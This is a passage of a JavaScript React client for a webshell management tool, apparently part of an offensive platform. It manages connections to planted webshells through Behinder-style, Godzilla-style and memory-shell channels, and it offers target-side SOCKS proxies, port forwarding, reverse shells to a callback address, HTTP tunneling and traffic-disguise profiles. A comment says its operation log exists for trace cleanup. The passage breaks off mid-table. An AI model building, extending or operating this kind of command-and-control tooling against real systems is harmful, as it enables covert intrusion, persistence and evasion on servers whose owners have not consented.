window.__ModuleLoader__.load({ id: "@dsh-external/dsh-webshell-mgr", factory: (require) => {
var module = { exports: {} }; var exports = module.exports;
// dsh-webshell-mgr client — 会话标签页「webshell 管理」（hunter 狩猎右侧）：
// 连接注册表（自动识别协议）+ 概览/文件/数据库/终端/生成器/插件 六工作区。
// UI 纪律：零 emoji；菜单与目录一律 popover（自适应视口）；无自动展开；面板精瘦。
"use strict";
var React = require("react");
var useState = React.useState, useEffect = React.useEffect, useRef = React.useRef;
var h = React.createElement;

function api(endpoint, payload) {
	return fetch("/dsh-webshell-mgr/" + endpoint, {
		method: "POST",
		headers: { "content-type": "application/json" },
		body: JSON.stringify(payload || {})
	}).then(function (r) { return r.json(); });
}

function fmtBytes(n) {
	n = Number(n) || 0;
	if (n < 1024) return n + " B";
	if (n < 1048576) return (n / 1024).toFixed(1) + " KB";
	if (n < 1073741824) return (n / 1048576).toFixed(1) + " MB";
	return (n / 1073741824).toFixed(2) + " GB";
}
function fmtTime(iso) { return iso ? String(iso).replace("T", " ").slice(0, 19) : ""; }
function basename(p) { var s = String(p ?? ""); var i = Math.max(s.lastIndexOf("/"), s.lastIndexOf("\\")); return i < 0 ? s : s.slice(i + 1); }
function dirnameOf(p) { var s = String(p ?? ""); var i = Math.max(s.lastIndexOf("/"), s.lastIndexOf("\\")); return i <= 0 ? "" : s.slice(0, i); }
function isWinPath(p) { return /:\\/.test(String(p ?? "")); }
function joinPath(dir, name) {
	var sep = isWinPath(dir) ? "\\" : "/";
	return dir.replace(/[\\/]+$/, "") + sep + name;
}

//#region 基础组件

function Btn(props) {
	return h("button", {
		type: "button",
		className: "dsh-wsm-btn" + (props.primary ? " is-primary" : "") + (props.danger ? " is-danger" : "") + (props.small ? " is-small" : ""),
		disabled: !!props.disabled,
		title: props.title || "",
		onClick: props.onClick
	}, props.children);
}

function Pill(props) {
	return h("span", { className: "dsh-wsm-pill" + (props.tone ? " is-" + props.tone : ""), title: props.title || "" }, props.children);
}

function Field(props) {
	return h("label", { className: "dsh-wsm-field" },
		h("span", { className: "dsh-wsm-field-label" }, props.label),
		props.children);
}

function Notice(props) {
	if (!props.msg) return null;
	return h("div", { className: "dsh-wsm-notice is-" + (props.kind || "info") }, props.msg);
}

/** 视口自适应 popover：手动触发打开，外点/ESC 关闭，位置自动钳制。 */
function Popover(props) {
	var ref = useRef(null);
	useEffect(function () {
		if (!props.open || !props.anchor) return;
		var el = ref.current;
		if (!el) return;
		var rect = el.getBoundingClientRect();
		var vw = window.innerWidth, vh = window.innerHeight;
		var w = Math.min(props.width || 300, vw - 16);
		var left = props.anchor.left;
		var top = props.anchor.bottom + 6;
		if (left + w > vw - 8) left = Math.max(8, vw - w - 8);
		if (top + rect.height > vh - 8) top = Math.max(8, props.anchor.top - rect.height - 6);
		el.style.left = left + "px";
		el.style.top = top + "px";
		el.style.visibility = "visible";
	});
	useEffect(function () {
		if (!props.open) return;
		var onDown = function (e) { if (ref.current && !ref.current.contains(e.target)) props.onClose(); };
		var onKey = function (e) { if (e.key === "Escape") props.onClose(); };
		document.addEventListener("mousedown", onDown);
		document.addEventListener("keydown", onKey);
		return function () {
			document.removeEventListener("mousedown", onDown);
			document.removeEventListener("keydown", onKey);
		};
	}, [props.open]);
	if (!props.open) return null;
	return h("div", { ref: ref, className: "dsh-wsm-popover", style: { left: "0px", top: "0px", visibility: "hidden", width: (props.width || 300) + "px" } },
		props.title ? h("div", { className: "dsh-wsm-popover-title" }, props.title) : null,
		props.children);
}

function Modal(props) {
	if (!props.open) return null;
	return h("div", { className: "dsh-wsm-modal-mask", onClick: props.onClose },
		h("div", { className: "dsh-wsm-modal" + (props.wide ? " is-wide" : ""), onClick: function (e) { e.stopPropagation(); } }, props.children));
}

/** 通用小表单模态：fields=[{key,label,value,placeholder}]。调用方须以 key 隔离（换表单=重挂载）。 */
function FormModal(props) {
	var init = {};
	(props.fields || []).forEach(function (f) { init[f.key] = f.value ?? ""; });
	var d = useState(init);
	var draft = d[0], setDraft = d[1];
	if (!props.open) return null;
	function set(k, v) {
		var n = Object.assign({}, draft);
		n[k] = v;
		setDraft(n);
	}
	return h(Modal, { open: true, onClose: props.onClose },
		h("h3", null, props.title || ""),
		(props.fields || []).map(function (f) {
			return h(Field, { key: f.key, label: f.label },
				h("input", { className: "dsh-wsm-input mono", placeholder: f.placeholder || "", value: draft[f.key] ?? "", onChange: function (e) { set(f.key, e.target.value); } }));
		}),
		props.notice ? h(Notice, { msg: props.notice, kind: "info" }) : null,
		h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
			h(Btn, { onClick: props.onClose }, "取消"),
			h(Btn, { primary: true, onClick: function () { props.onSubmit(draft); } }, props.submitLabel || "确定")));
}

//#endregion

//#region 样式

function installStyles() {
	if (document.getElementById("dsh-wsm-style")) return function () {};
	var css = [
		".dsh-wsm-root{height:100%;display:flex;flex-direction:column;min-height:0;background:var(--dsw-alias-bg-base,#fff);color:var(--dsw-alias-label-primary,#1a1a1a);font-size:13px}",
		".dsh-wsm-head{display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:1px solid var(--dsw-alias-border-l2,#e4e4e7);flex-wrap:wrap}",
		".dsh-wsm-title{font-size:15px;font-weight:600}",
		".dsh-wsm-sub{font-size:12px;color:var(--dsw-alias-label-tertiary,#8a8a8f)}",
		".dsh-wsm-spacer{flex:1}",
		".dsh-wsm-main{flex:1;min-height:0;display:flex}",
		".dsh-wsm-rail{width:230px;flex:none;border-right:1px solid var(--dsw-alias-border-l2,#e4e4e7);display:flex;flex-direction:column;min-height:0}",
		".dsh-wsm-rail.is-collapsed{display:none}",
		".dsh-wsm-rail-head{padding:8px 10px;display:flex;gap:6px;align-items:center;border-bottom:1px solid var(--dsw-alias-border-l1,#e9e9ec)}",
		".dsh-wsm-rail-list{flex:1;overflow:auto;padding:6px}",
		".dsh-wsm-conn{display:flex;align-items:center;gap:6px;padding:6px 8px;border-radius:7px;cursor:pointer;font-size:12.5px}",
		".dsh-wsm-conn:hover{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-conn.is-active{background:color-mix(in srgb,var(--dsw-alias-accent,#4c6ef5) 12%,transparent);font-weight:600}",
		".dsh-wsm-conn .n{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}",
		".dsh-wsm-dot{width:8px;height:8px;border-radius:50%;flex:none;background:var(--dsw-alias-label-tertiary,#8a8a8f)}",
		".dsh-wsm-dot.is-ok{background:#2f9e44}.dsh-wsm-dot.is-dead{background:#c92a2a}",
		".dsh-wsm-work{flex:1;min-width:0;display:flex;flex-direction:column}",
		".dsh-wsm-tabs{display:flex;gap:2px;border-bottom:1px solid var(--dsw-alias-border-l2,#e4e4e7);padding:0 12px}",
		".dsh-wsm-tab{border:none;background:none;padding:8px 12px;font-size:13px;cursor:pointer;color:var(--dsw-alias-label-secondary,#5b5b60);border-bottom:2px solid transparent}",
		".dsh-wsm-tab.is-active{color:var(--dsw-alias-label-primary,#1a1a1a);font-weight:600;border-bottom-color:var(--dsw-alias-accent,#4c6ef5)}",
		".dsh-wsm-pane{flex:1;min-height:0;overflow:auto;padding:14px 16px;display:flex;flex-direction:column;gap:12px}",
		".dsh-wsm-btn{border:1px solid var(--dsw-alias-border-l1,#e9e9ec);background:var(--dsw-alias-bg-base,#fff);color:var(--dsw-alias-label-primary,#1a1a1a);border-radius:7px;padding:6px 12px;font-size:12.5px;cursor:pointer;white-space:nowrap}",
		".dsh-wsm-btn:hover{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-btn.is-primary{background:var(--dsw-alias-accent,#4c6ef5);border-color:var(--dsw-alias-accent,#4c6ef5);color:#fff}",
		".dsh-wsm-btn.is-danger{color:#c92a2a;border-color:#f1a9a9}",
		".dsh-wsm-btn.is-small{padding:3px 8px;font-size:12px}",
		".dsh-wsm-btn:disabled{opacity:.45;cursor:not-allowed}",
		".dsh-wsm-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}",
		".dsh-wsm-input,.dsh-wsm-select,.dsh-wsm-textarea{border:1px solid var(--dsw-alias-border-l1,#e9e9ec);border-radius:7px;padding:7px 10px;font-size:13px;background:var(--dsw-alias-bg-base,#fff);color:var(--dsw-alias-label-primary,#1a1a1a);font-family:inherit}",
		".dsh-wsm-input.mono,.dsh-wsm-textarea{font-family:monospace;font-size:12.5px}",
		".dsh-wsm-textarea{width:100%;resize:vertical;min-height:90px}",
		".dsh-wsm-pill{display:inline-block;border:1px solid var(--dsw-alias-border-l1,#e9e9ec);border-radius:10px;padding:1px 8px;font-size:11px;color:var(--dsw-alias-label-secondary,#5b5b60);margin-right:4px}",
		".dsh-wsm-pill.is-ok{color:#2b8a3e;border-color:#b2f2bb;background:#ebfbee}",
		".dsh-wsm-pill.is-dead{color:#c92a2a;border-color:#ffc9c9;background:#fff5f5}",
		".dsh-wsm-pill.is-accent{color:var(--dsw-alias-accent,#4c6ef5);border-color:color-mix(in srgb,var(--dsw-alias-accent,#4c6ef5) 40%,transparent)}",
		".dsh-wsm-notice{border-radius:8px;padding:9px 12px;font-size:12.5px;background:color-mix(in srgb,var(--dsw-alias-accent,#4c6ef5) 8%,transparent)}",
		".dsh-wsm-notice.is-error{background:#fff5f5;border:1px solid #ffc9c9;color:#c92a2a}",
		".dsh-wsm-notice.is-success{background:#ebfbee;border:1px solid #b2f2bb;color:#2b8a3e}",
		".dsh-wsm-table{width:100%;border-collapse:collapse;font-size:12.5px}",
		".dsh-wsm-table th,.dsh-wsm-table td{border-bottom:1px solid var(--dsw-alias-border-l2,#e4e4e7);padding:6px 8px;text-align:left;vertical-align:top;white-space:nowrap}",
		".dsh-wsm-table th{position:sticky;top:0;background:var(--dsw-alias-bg-base,#fff);color:var(--dsw-alias-label-secondary,#5b5b60);font-weight:600;font-size:12px;z-index:1}",
		".dsh-wsm-table td.wrap{white-space:normal;word-break:break-all}",
		".dsh-wsm-table tr:hover td{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-mono{font-family:monospace;font-size:12px}",
		".dsh-wsm-kv{display:grid;grid-template-columns:110px 1fr;gap:6px 10px;font-size:12.5px}",
		".dsh-wsm-kv dt{color:var(--dsw-alias-label-tertiary,#8a8a8f)}",
		".dsh-wsm-kv dd{margin:0;word-break:break-all}",
		".dsh-wsm-modal-mask{position:fixed;inset:0;background:rgba(0,0,0,.35);display:flex;align-items:center;justify-content:center;z-index:200}",
		".dsh-wsm-modal{width:560px;max-width:92vw;max-height:84vh;overflow:auto;background:var(--dsw-alias-bg-base,#fff);border-radius:12px;padding:18px;display:flex;flex-direction:column;gap:12px;box-shadow:0 12px 40px rgba(0,0,0,.25)}",
		".dsh-wsm-modal.is-wide{width:820px}",
		".dsh-wsm-modal h3{margin:0;font-size:15px}",
		".dsh-wsm-field{display:flex;flex-direction:column;gap:4px;font-size:12px}",
		".dsh-wsm-field-label{color:var(--dsw-alias-label-secondary,#5b5b60);font-weight:600}",
		".dsh-wsm-popover{position:fixed;z-index:300;background:var(--dsw-alias-bg-base,#fff);border:1px solid var(--dsw-alias-border-l2,#e4e4e7);border-radius:10px;box-shadow:0 10px 34px rgba(0,0,0,.22);padding:8px;max-height:70vh;overflow:auto}",
		".dsh-wsm-popover-title{font-size:11.5px;font-weight:600;color:var(--dsw-alias-label-tertiary,#8a8a8f);padding:2px 6px 6px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}",
		".dsh-wsm-menu-item{display:flex;align-items:center;gap:6px;width:100%;border:none;background:none;text-align:left;padding:7px 10px;font-size:12.5px;border-radius:7px;cursor:pointer;color:inherit}",
		".dsh-wsm-menu-item:hover{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-menu-item.is-danger{color:#c92a2a}",
		".dsh-wsm-term{flex:1;min-height:160px;background:var(--dsw-alias-bg-inset,#14161a);color:#d5dbe6;border-radius:10px;padding:10px 12px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;overflow:auto}",
		".dsh-wsm-term .is-cmd{color:#8ab4ff}",
		".dsh-wsm-term .is-err{color:#ff8787}",
		".dsh-wsm-term-in{flex:1;font-family:monospace;font-size:12.5px;border:1px solid var(--dsw-alias-border-l1,#e9e9ec);border-radius:8px;padding:8px 10px;background:var(--dsw-alias-bg-base,#fff);color:inherit}",
		".dsh-wsm-crumbs{display:flex;gap:2px;align-items:center;flex-wrap:wrap;font-family:monospace;font-size:12px;flex:1;min-width:120px}",
		".dsh-wsm-crumb{border:none;background:none;cursor:pointer;padding:3px 5px;border-radius:5px;color:var(--dsw-alias-accent,#4c6ef5);font-family:monospace;font-size:12px}",
		".dsh-wsm-crumb:hover{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-ftype{display:inline-block;width:9px;height:9px;border-radius:2px;vertical-align:-1px;margin-right:6px;border:1.5px solid var(--dsw-alias-label-tertiary,#8a8a8f)}",
		".dsh-wsm-ftype.is-dir{background:var(--dsw-alias-accent,#4c6ef5);border-color:var(--dsw-alias-accent,#4c6ef5)}",
		".dsh-wsm-name{cursor:pointer;font-family:monospace;font-size:12px}",
		".dsh-wsm-name.is-dir{font-weight:600}",
		".dsh-wsm-name:hover{color:var(--dsw-alias-accent,#4c6ef5);text-decoration:underline}",
		".dsh-wsm-scrollbox{border:1px solid var(--dsw-alias-border-l1,#e9e9ec);border-radius:10px;max-height:52vh;overflow:auto}",
		".dsh-wsm-scrollbox .dsh-wsm-table{border:none}",
		".dsh-wsm-upbar{height:4px;border-radius:2px;background:var(--dsw-alias-border-l1,#e9e9ec);overflow:hidden}",
		".dsh-wsm-upbar > div{height:100%;background:var(--dsw-alias-accent,#4c6ef5);transition:width .2s}",
		".dsh-wsm-skel{border:1px dashed var(--dsw-alias-border-l1,#e9e9ec);border-radius:10px;padding:36px 20px;text-align:center;color:var(--dsw-alias-label-tertiary,#8a8a8f)}",
		".dsh-wsm-up{position:relative;overflow:hidden}",
		".dsh-wsm-up input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer}",
		".dsh-wsm-tree-node{padding:3px 6px 3px calc(6px + var(--depth,0) * 16px);border-radius:6px;cursor:pointer;display:flex;gap:6px;align-items:center;font-size:12.5px}",
		".dsh-wsm-tree-node:hover{background:var(--dsw-alias-interactive-bg-hover,#f4f4f5)}",
		".dsh-wsm-caret{width:14px;flex:none;color:var(--dsw-alias-label-tertiary,#8a8a8f);font-size:10px}",
		"@media (max-width:860px){.dsh-wsm-rail{position:absolute;left:0;top:0;bottom:0;z-index:50;background:var(--dsw-alias-bg-base,#fff);box-shadow:0 6px 24px rgba(0,0,0,.18)}}"
	].join("\n");
	var style = document.createElement("style");
	style.id = "dsh-wsm-style";
	style.textContent = css;
	document.head.appendChild(style);
	return function () { style.remove(); };
}

//#endregion

//#region 连接表单

var PROTOCOL_ROWS = [
	{ id: "cmd-system", label: "一句话（命令通道）" },
	{ id: "cmd-eval", label: "一句话（eval 通道）" },
	{ id: "dsh-aes", label: "自研加密通道" },
	{ id: "behinder", label: "冰蝎型通道（AES-ECB）" },
	{ id: "behinder-java", label: "冰蝎型通道（JSP·AES-ECB·编译载荷）" },
	{ id: "behinder-aspx", label: "冰蝎型通道（ASPX·AES-ECB·程序集载荷）" },
	{ id: "godzilla-aspx", label: "哥斯拉型通道（ASPX·CSHAP_AES_BASE64）" },
	{ id: "godzilla", label: "哥斯拉型通道（XOR_BASE64）" },
	{ id: "godzilla-java", label: "哥斯拉型通道（JSP·JAVA_AES_BASE64）" },
	{ id: "dsh-mem", label: "内存马通道（X-C 头触发）" },
	{ id: "behinder-mod", label: "魔改冰蝎型通道" },
	{ id: "godzilla-mod", label: "魔改哥斯拉型通道" }
];

function ConnForm(props) {
	if (!props.open) return null;
	var editing = props.editing || {};
	var draft0 = {
		name: editing.name || "", url: editing.url || "", protocol: editing.protocol || "cmd-system",
		shell_lang: editing.shell_lang || "php", pass_param: editing.pass_param || "pass", cmd_param: editing.cmd_param || "cmd",
		password: "", secret_key: editing.secretKey || "", method: editing.method || "post",
		encoding: editing.encoding || "auto", os: editing.os || "auto", kind: editing.kind || "file", remark: editing.remark || "", profile_json: editing.profile_json || "", timeout_ms: editing.timeoutMs || 20000
	};
	var d = useState(draft0), draft = d[0], setDraft = d[1];
	var busy = useState(false);
	var msg = useState("");
	var detected = useState(null);
	function set(k, v) { setDraft(function (p) { var n = Object.assign({}, p); n[k] = v; return n; }); }
	function autoDetect() {
		if (!draft.url) { msg[1]("先填 URL"); return; }
		busy[1](true); msg[1](""); detected[1](null);
		api("conn.detect", { url: draft.url, password: draft.password, secretKey: draft.secret_key, passParam: draft.pass_param, cmdParam: draft.cmd_param, method: draft.method }).then(function (r) {
			busy[1](false);
			if (r.hit) {
				detected[1](r);
				set("protocol", r.protocol);
				set("shell_lang", r.shellLang);
				set("os", r.os);
				if (r.kindHint) set("kind", r.kindHint);
				msg[1]("");
			} else msg[1]("未识别：" + r.error);
		}).catch(function (e) { busy[1](false); msg[1](String(e)); });
	}
	function save() {
		if (!draft.url) { msg[1]("URL 不能为空"); return; }
		busy[1](true); msg[1]("");
		var payload = Object.assign({}, draft, { id: editing.id, headers: editing.headers || {} });
		if (!draft.password && editing.passwordSet) delete payload.password;
		if (!draft.secret_key && editing.secretKey) delete payload.secret_key;
		api("conn.save", payload).then(function (r) {
			busy[1](false);
			if (r.conn) props.onSaved(r.conn);
			else msg[1](r.error || "保存失败");
		}).catch(function (e) { busy[1](false); msg[1](String(e)); });
	}
	return h("div", { className: "dsh-wsm-modal-mask", onClick: props.onClose },
		h("div", { className: "dsh-wsm-modal", onClick: function (e) { e.stopPropagation(); } },
			h("h3", null, editing.id ? "编辑连接" : "新建连接"),
			h(Notice, { msg: msg[0], kind: "error" }),
			h("div", { className: "dsh-wsm-row" },
				h("input", { className: "dsh-wsm-input mono", style: { flex: 1, minWidth: 240 }, placeholder: "http://target/shell.php（内存马填任意存活路径）", value: draft.url, onChange: function (e) { set("url", e.target.value); } }),
				h(Btn, { disabled: busy[0], onClick: autoDetect }, busy[0] ? "识别中…" : "自动识别")),
			detected[0] ? h("div", { className: "dsh-wsm-notice" },
				"已识别：" + detected[0].protocol + " / " + detected[0].shellLang + " / OS=" + detected[0].os,
				detected[0].basicInfo ? "（" + (detected[0].basicInfo.user || "?") + " @ " + (detected[0].basicInfo.cwd || "?") + "）" : "") : null,
			h("div", { className: "dsh-wsm-row" },
				h(Field, { label: "名称" }, h("input", { className: "dsh-wsm-input", value: draft.name, onChange: function (e) { set("name", e.target.value); }, placeholder: "默认 hostname" })),
				h(Field, { label: "通道" }, h("select", { className: "dsh-wsm-select", value: draft.protocol, onChange: function (e) { set("protocol", e.target.value); } },
					PROTOCOL_ROWS.map(function (p) { return h("option", { key: p.id, value: p.id }, p.label); }))),
				h(Field, { label: "语言" }, h("select", { className: "dsh-wsm-select", value: draft.shell_lang, onChange: function (e) { set("shell_lang", e.target.value); } },
					["php", "jsp", "aspx"].map(function (l) { return h("option", { key: l, value: l }, l); }))),
				h(Field, { label: "OS" }, h("select", { className: "dsh-wsm-select", value: draft.os, onChange: function (e) { set("os", e.target.value); } },
					["auto", "linux", "windows"].map(function (l) { return h("option", { key: l, value: l }, l); }))),
				h(Field, { label: "形态" }, h("select", { className: "dsh-wsm-select", value: draft.kind, onChange: function (e) { set("kind", e.target.value); }, title: "内存马=无落盘载荷（经注入通道建立，协议同文件马）" },
					h("option", { value: "file" }, "文件马"), h("option", { value: "mem" }, "内存马")))),
			h("div", { className: "dsh-wsm-row" },
				h(Field, { label: "口令" + (editing.passwordSet ? "（留空保持）" : "") }, h("input", { className: "dsh-wsm-input mono", type: "password", value: draft.password, onChange: function (e) { set("password", e.target.value); } })),
				h(Field, { label: "盐（魔改通道）" }, h("input", { className: "dsh-wsm-input mono", value: draft.secret_key, onChange: function (e) { set("secret_key", e.target.value); } })),
				h(Field, { label: "口令参数名" }, h("input", { className: "dsh-wsm-input mono", value: draft.pass_param, onChange: function (e) { set("pass_param", e.target.value); } })),
				h(Field, { label: "命令参数名" }, h("input", { className: "dsh-wsm-input mono", value: draft.cmd_param, onChange: function (e) { set("cmd_param", e.target.value); } }))),
			h("div", { className: "dsh-wsm-row" },
				h(Field, { label: "请求方式" }, h("select", { className: "dsh-wsm-select", value: draft.method, onChange: function (e) { set("method", e.target.value); } },
					h("option", { value: "post" }, "POST"), h("option", { value: "get" }, "GET"))),
				h(Field, { label: "编码" }, h("select", { className: "dsh-wsm-select", value: draft.encoding, onChange: function (e) { set("encoding", e.target.value); } },
					["auto", "utf-8", "gbk", "gb18030"].map(function (l) { return h("option", { key: l, value: l }, l); }))),
				h(Field, { label: "超时(ms)" }, h("input", { className: "dsh-wsm-input", type: "number", value: draft.timeout_ms, onChange: function (e) { set("timeout_ms", Number(e.target.value) || 20000); } }))),
			h(Field, { label: "备注" }, h("input", { className: "dsh-wsm-input", value: draft.remark, onChange: function (e) { set("remark", e.target.value); } })),
			h(Field, { label: "流量伪装 profile（JSON，可选）" }, h("textarea", { className: "dsh-wsm-input mono", style: { minHeight: 54, fontFamily: "monospace" }, placeholder: '{"uas":["UA1","UA2"],"headers":{"X-A":"1"},"strip":["<<",">>"]}', value: draft.profile_json, onChange: function (e) { set("profile_json", e.target.value); } })),
			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
				h(Btn, { onClick: props.onClose }, "取消"),
				h(Btn, { primary: true, disabled: busy[0], onClick: save }, "保存"))));
}

//#endregion

//#region 概览

function OverviewPane(props) {
	var conn = props.conn;
	var ops = useState(null);
	var probing = useState(false);
	var unloadMenu = useState(null);
	var unloadName = useState("");
	var unloadBusy = useState(false);
	var netMenu = useState(null);
	var netKind = useState("socks");
	var netPort = useState("18080");
	var netHost = useState("");
	var netTarget = useState("");
	var netBusy = useState(false);
	useEffect(function () {
		ops[1](null);
		if (conn) api("ops.recent", { connId: conn.id, limit: 30 }).then(ops[1]).catch(function () { ops[1]({ ops: [] }); });
	}, [conn && conn.id]);
	if (!conn) return h("div", { className: "dsh-wsm-skel" }, "左侧选择或新建一个连接");
	var info = conn.basicInfo || {};
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-row" },
			h(Pill, { tone: "accent" }, conn.protocol),
			h(Pill, null, conn.shell_lang),
			h(Pill, null, "os=" + conn.os),
			conn.kind === "mem" ? h(Pill, { tone: "ok" }, "内存马") : null,
			h(Pill, { tone: conn.last_status === "ok" ? "ok" : conn.last_status === "dead" ? "dead" : "" }, conn.last_status),
			h("span", { className: "dsh-wsm-spacer" }),
			conn.kind === "mem" ? (conn.protocol === "behinder-java"
				? h(Btn, { small: true, onClick: function (e) {
					var r = e.currentTarget.getBoundingClientRect();
					unloadMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
				} }, "卸载内存马")
				: h("span", { className: "dsh-wsm-sub", title: "X-C 头通道只能执行命令——卸载需 defineClass 载荷（behinder-java）" }, "卸载需 behinder-java 通道")) : null,
			h(Btn, { small: true, onClick: function (e) {
				var r = e.currentTarget.getBoundingClientRect();
				netMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
			} }, "网络"),
			h(Btn, { small: true, disabled: probing[0], onClick: function () {
				probing[1](true);
				api("conn.probe", { id: conn.id }).then(function () { probing[1](false); props.onRefresh(); }).catch(function () { probing[1](false); });
			} }, probing[0] ? "探测中…" : "重新探活")),
		netMenu[0] ? h(Popover, { open: true, anchor: netMenu[0].anchor, onClose: function () { netMenu[1](null); }, title: "网络动作（目标侧载荷 / HTTP 隧道）", width: 380 },
			h(Field, { label: "动作" }, h("select", { className: "dsh-wsm-select", value: netKind[0], onChange: function (e) { netKind[1](e.target.value); } },
				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "socks" }, "SOCKS5（目标侧）") : null,
				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "fwd" }, "端口转发（目标侧）") : null,
				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "reverse" }, "反弹 shell") : null,
				conn.protocol === "godzilla-java" ? h("option", { value: "tunnel.start" }, "HTTP 隧道（本地 SOCKS）") : null,
				h("option", { value: "tunnel.status" }, "隧道状态"),
				h("option", { value: "tunnel.stop" }, "停隧道（按本地端口）"))),
			netKind[0] === "socks" ? h(Field, { label: "目标监听端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })) : null,
			netKind[0] === "fwd" ? h("div", { className: "dsh-wsm-row" },
				h(Field, { label: "监听端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })),
				h(Field, { label: "目标 host:port" }, h("input", { className: "dsh-wsm-input mono", placeholder: "10.0.0.5:3306", value: netTarget[0], onChange: function (e) { netTarget[1](e.target.value); } }))) : null,
			netKind[0] === "reverse" ? h("div", { className: "dsh-wsm-row" },
				h(Field, { label: "回连 host:port" }, h("input", { className: "dsh-wsm-input mono", placeholder: "1.2.3.4:4444", value: netTarget[0], onChange: function (e) { netTarget[1](e.target.value); } }))) : null,
			netKind[0] === "tunnel.start" || netKind[0] === "tunnel.stop" ? h(Field, { label: "本地 SOCKS 端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })) : null,
			h("div", { className: "dsh-wsm-notice" }, netKind[0] === "tunnel.start"
				? "全部流量封装 web 请求（目标不开新端口）；本地配 SOCKS5 代理 127.0.0.1:端口"
				: "动作入 op_log 台账；socks/fwd/reverse 为目标侧常驻线程（重启即消）"),
			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
				h(Btn, { disabled: netBusy[0], onClick: function () { netMenu[1](null); } }, "取消"),
				h(Btn, { primary: true, disabled: netBusy[0], onClick: function () {
					netBusy[1](true);
					var payload = { connId: conn.id };
					if (netKind[0] === "tunnel.start" || netKind[0] === "tunnel.stop") { payload.localPort = Number(netPort[0]) || 0; }
					else if (netKind[0] === "tunnel.status") {}
					else {
						payload.kind = netKind[0];
						if (netKind[0] === "socks") payload.port = Number(netPort[0]) || 18080;
						if (netKind[0] === "fwd") { var hp = String(netTarget[0] || "").split(":"); payload.listen = Number(netPort[0]) || 0; payload.host = hp[0] || ""; payload.port = Number(hp[1]) || 0; }
						if (netKind[0] === "reverse") { var hp2 = String(netTarget[0] || "").split(":"); payload.host = hp2[0] || ""; payload.port = Number(hp2[1]) || 0; }
					}
					api(netKind[0] && netKind[0].startsWith("tunnel") ? netKind[0] : "net.action", payload).then(function (r) {
						netBusy[1](false);
						var text = r.output || JSON.stringify(r);
						if (r.tunnels) text = r.tunnels.length ? r.tunnels.map(function (t) { return "本地 :" + t.port + "（" + t.sessions + " 会话）"; }).join("；") : "（无活跃隧道）";
						alert("结果：" + text);
						netMenu[1](null);
					}).catch(function (e) { netBusy[1](false); alert("失败：" + String(e)); });
				} }, netBusy[0] ? "执行中…" : "执行"))) : null,
		unloadMenu[0] ? h(Popover, { open: true, anchor: unloadMenu[0].anchor, onClose: function () { unloadMenu[1](null); unloadName[1](""); }, title: "卸载内存马（Tomcat Filter 三注册面移除）", width: 360 },
			h("div", { className: "dsh-wsm-notice" }, "Filter 名留空 = 自动读引导器登记（本插件引导器注入的马）。卸载后该连接即断（预期行为）。"),
			h(Field, { label: "Filter 名（可选）" }, h("input", { className: "dsh-wsm-input mono", value: unloadName[0], onChange: function (e) { unloadName[1](e.target.value); }, placeholder: "x-xxxxxxxx（留空自动定位）" })),
			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
				h(Btn, { disabled: unloadBusy[0], onClick: function () { unloadMenu[1](null); unloadName[1](""); } }, "取消"),
				h(Btn, { primary: true, disabled: unloadBusy[0], onClick: function () {
					unloadBusy[1](true);
					api("mem.unload", { connId: conn.id, name: unloadName[0] }).then(function (r) {
						unloadBusy[1](false); unloadMenu[1](null); unloadName[1]("");
						props.onRefresh && props.onRefresh();
						alert("卸载结果：" + (r.output || "ok") + "——连接已断属预期");
					}).catch(function (e) { unloadBusy[1](false); alert("卸载失败：" + String(e)); });
				} }, unloadBusy[0] ? "卸载中…" : "确认卸载"))) : null,
		h("div", { className: "dsh-wsm-kv" },
			h("dt", null, "地址"), h("dd", { className: "dsh-wsm-mono" }, conn.url),
			h("dt", null, "当前用户"), h("dd", { className: "dsh-wsm-mono" }, info.user || "—"),
			h("dt", null, "工作目录"), h("dd", { className: "dsh-wsm-mono" }, info.cwd || "—"),
			h("dt", null, "系统"), h("dd", { className: "dsh-wsm-mono" }, (info.osDetail || info.os || conn.os) || "—"),
			info.php ? h("dt", null, "PHP") : null, info.php ? h("dd", { className: "dsh-wsm-mono" }, info.php + " / " + (info.sapi || "")) : null,
			info.java ? h("dt", null, "Java") : null, info.java ? h("dd", { className: "dsh-wsm-mono" }, info.java + (info.cpus ? "（" + info.cpus + " 核）" : "")) : null,
			info.disabledFunctions ? h("dt", null, "禁用函数") : null, info.disabledFunctions ? h("dd", { className: "dsh-wsm-mono" }, String(info.disabledFunctions).slice(0, 300)) : null,
			h("dt", null, "备注"), h("dd", null, conn.remark || "—"),
			h("dt", null, "最近探活"), h("dd", null, fmtTime(conn.last_probe_at) || "—")),
		h("div", null,
			h("div", { className: "dsh-wsm-sub", style: { marginBottom: 6 } }, "最近操作台账（op_log——清痕对账用）"),
			ops[0] === null ? h("div", { className: "dsh-wsm-sub" }, "读取中…") :
				h("div", { className: "dsh-wsm-scrollbox", style: { maxHeight: "34vh" } },
					h("table", { className: "dsh-wsm-table" },
